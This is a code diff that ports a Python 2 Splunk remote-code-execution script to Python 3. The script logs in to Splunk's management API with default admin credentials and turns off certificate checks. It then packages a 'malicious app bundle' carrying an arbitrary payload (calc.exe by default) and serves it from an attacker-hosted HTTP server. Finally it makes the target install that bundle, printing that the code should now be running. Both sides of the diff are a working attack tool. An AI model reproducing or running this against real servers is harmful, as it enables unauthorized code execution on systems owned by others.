@@ -1,12 +1,19 @@
-import sys, os, tempfile, shutil
-import tarfile
-import requests
-import SocketServer
-from SimpleHTTPServer import SimpleHTTPRequestHandler
 import argparse
+import os
+import shutil
+import socketserver
+import sys
+import tarfile
+import tempfile
 import threading
+from http.server import SimpleHTTPRequestHandler
 
-requests.packages.urllib3.disable_warnings(category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
+import requests
+from requests.auth import HTTPBasicAuth
+from requests.packages.urllib3 import disable_warnings
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 SPLUNK_APP_NAME = '_PWN_APP_'
 
@@ -52,7 +59,7 @@ class CustomHandler(SimpleHTTPRequestHandler):
         self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
         self.send_header('Content-type', 'application/tar')
         self.send_header('Content-Disposition', 'attachment; filename="splunk_bundle.tar"')
-        self.send_header('Content-Length', len(bundle))
+        self.send_header('Content-Length', str(len(bundle)))
         self.end_headers()
 
         self.wfile.write(bundle)
@@ -69,8 +76,8 @@ class ThreadedHTTPServer(object):
         prepares the thread to run the serve_forever method of the socket
         server as a daemon once it is started
         """
-        SocketServer.TCPServer.allow_reuse_address = True
-        self.server = SocketServer.TCPServer((host, port), request_handler)
+        socketserver.TCPServer.allow_reuse_address = True
+        self.server = socketserver.TCPServer((host, port), request_handler)
         self.server_thread = threading.Thread(target=self.server.serve_forever)
         self.server_thread.daemon = True
         self.server_thread.start()
@@ -83,65 +90,65 @@ class ThreadedHTTPServer(object):
         self.server.server_close()
 
 
-parser = argparse.ArgumentParser()
-parser.add_argument('--scheme', default="https")
-parser.add_argument('--host', required=True)
-parser.add_argument('--port', default=8089)
-parser.add_argument('--lhost', required=True)
-parser.add_argument('--lport', default=8181)
-parser.add_argument('--username', default="admin")
-parser.add_argument('--password', default="changeme")
-parser.add_argument('--payload', default="calc.exe")
-parser.add_argument('--payload-file', default="pwn.bat")
-options = parser.parse_args()
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--scheme', default="https")
+    parser.add_argument('--host', required=True)
+    parser.add_argument('--port', default=8089)
+    parser.add_argument('--lhost', required=True)
+    parser.add_argument('--lport', default=8181)
+    parser.add_argument('--username', default="admin")
+    parser.add_argument('--password', default="changeme")
+    parser.add_argument('--payload', default="calc.exe")
+    parser.add_argument('--payload-file', default="pwn.bat")
+    options = parser.parse_args()
 
-print "Running in remote mode (Remote Code Execution)"
+    print("Running in remote mode (Remote Code Execution)")
 
-SPLUNK_BASE_API = "{}://{}:{}/services/apps/local/".format(options.scheme, options.host, options.port, )
+    SPLUNK_BASE_API = "{}://{}:{}/services/apps/local/".format(options.scheme, options.host, options.port, )
 
-s = requests.Session()
-s.auth = requests.auth.HTTPBasicAuth(options.username, options.password)
-s.verify = False
+    s = requests.Session()
+    s.auth = HTTPBasicAuth(options.username, options.password)
+    s.verify = False
 
-print "[.] Authenticating..."
-req = s.get(SPLUNK_BASE_API)
-if req.status_code == 401:
-    print "Authentication failure"
-    print ""
-    print req.text
-    sys.exit(-1)
-print "[+] Authenticated"
+    print("[.] Authenticating...")
+    req = s.get(SPLUNK_BASE_API)
+    if req.status_code == 401:
+        print("Authentication failure")
+        print("")
+        print(req.text)
+        sys.exit(-1)
+    print("[+] Authenticated")
 
-print "[.] Creating malicious app bundle..."
-BUNDLE_FILE = create_splunk_bundle(options)
-print "[+] Created malicious app bundle in: " + BUNDLE_FILE
+    print("[.] Creating malicious app bundle...")
+    BUNDLE_FILE = create_splunk_bundle(options)
+    print("[+] Created malicious app bundle in: " + BUNDLE_FILE)
 
-httpd = ThreadedHTTPServer(options.lhost, options.lport, request_handler=CustomHandler)
-print "[+] Started HTTP server for remote mode"
+    httpd = ThreadedHTTPServer(options.lhost, options.lport, request_handler=CustomHandler)
+    print("[+] Started HTTP server for remote mode")
 
-lurl = "http://{}:{}/".format(options.lhost, options.lport)
+    lurl = "http://{}:{}/".format(options.lhost, options.lport)
 
-print "[.] Installing app from: " + lurl
-req = s.post(SPLUNK_BASE_API, data={'name': lurl, 'filename': True, 'update': True})
-if req.status_code != 200 and req.status_code != 201:
-    print "Got a problem: " + str(req.status_code)
-    print ""
-    print req.text
-print "[+] App installed, your code should be running now!"
+    print("[.] Installing app from: " + lurl)
+    req = s.post(SPLUNK_BASE_API, data={'name': lurl, 'filename': True, 'update': True})
+    if req.status_code != 200 and req.status_code != 201:
+        print("Got a problem: " + str(req.status_code))
+        print("")
+        print(req.text)
+    print("[+] App installed, your code should be running now!")
 
-print "\nPress RETURN to cleanup"
-raw_input()
-os.remove(BUNDLE_FILE)
+    input("\nPress RETURN to cleanup")
+    os.remove(BUNDLE_FILE)
 
-print "[.] Removing app..."
-req = s.delete(SPLUNK_BASE_API + SPLUNK_APP_NAME)
-if req.status_code != 200 and req.status_code != 201:
-    print "Got a problem: " + str(req.status_code)
-    print ""
-    print req.text
-print "[+] App removed"
+    print("[.] Removing app...")
+    req = s.delete(SPLUNK_BASE_API + SPLUNK_APP_NAME)
+    if req.status_code != 200 and req.status_code != 201:
+        print("Got a problem: " + str(req.status_code))
+        print("")
+        print(req.text)
+    print("[+] App removed")
 
-httpd.stop()
-print "[+] Stopped HTTP server"
+    httpd.stop()
+    print("[+] Stopped HTTP server")
 
-print "Bye!"
+    print("Bye!")
